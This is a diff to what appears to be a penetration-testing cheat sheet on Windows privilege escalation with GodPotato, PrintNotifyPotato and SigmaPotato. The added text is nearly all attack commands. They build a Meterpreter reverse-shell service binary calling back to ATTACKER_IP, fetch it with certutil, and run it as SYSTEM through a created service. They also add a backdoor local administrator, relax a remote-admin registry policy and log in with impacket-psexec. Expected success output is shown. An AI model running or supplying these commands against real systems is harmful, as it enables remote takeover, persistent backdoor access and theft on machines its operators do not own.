@@ -41,6 +41,78 @@ CurrentUser: NT AUTHORITY\SYSTEM
 process start with pid <pid>
 ```
 
+#### GodPotato service payload
+
+If a direct reverse payload starts but dies, use GodPotato to create and start a service that runs as LocalSystem.
+
+Create a service executable:
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=80 -f exe-service -o service.exe
+```
+
+Stage a service creation script in the same writable directory as the payload:
+
+```cmd
+certutil.exe -urlcache -f http://ATTACKER_IP:8000/service.exe service.exe
+
+echo 'sc create "meter" binPath= "C:\Windows\System32\spool\drivers\color\service.exe"' > service.bat
+echo 'net start meter' >> service.bat
+# check 
+cat service.bat
+```
+
+Run the script through GodPotato:
+
+```cmd
+GodPotato.exe -cmd "cmd /c C:\Windows\System32\spool\drivers\color\service.bat"
+```
+
+Successful output:
+
+```text
+CurrentUser: NT AUTHORITY\NETWORK SERVICE
+Find System Token : True
+CurrentUser: NT AUTHORITY\SYSTEM
+[SC] CreateService SUCCESS
+The meter service is starting
+Meterpreter session opened
+```
+
+### PrintNotifyPotato
+
+Use the .NET 4.6 build when available:
+
+```cmd
+PrintNotifyPotato-NET46.exe whoami
+```
+
+Successful indicators:
+
+```text
+Create PrintNotify Success!
+Got Token
+CurrentUser: NT AUTHORITY\SYSTEM
+DuplicateTokenEx Success!
+process start with pid <pid>
+```
+
+### SigmaPotato
+
+SigmaPotato can run privileged account-management commands:
+
+```cmd
+SigmaPotato.exe "net user ice-wzl Lab123 /add"
+SigmaPotato.exe "net localgroup Administrators ice-wzl /add"
+SigmaPotato.exe "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"
+```
+
+Then authenticate remotely with the new local admin:
+
+```bash
+impacket-psexec ice-wzl:'Lab123'@TARGET
+```
+
 ### RoguePotato
 - Alternative to JuicyPotato for newer Windows versions
 - https://github.com/antonioCoco/RoguePotato
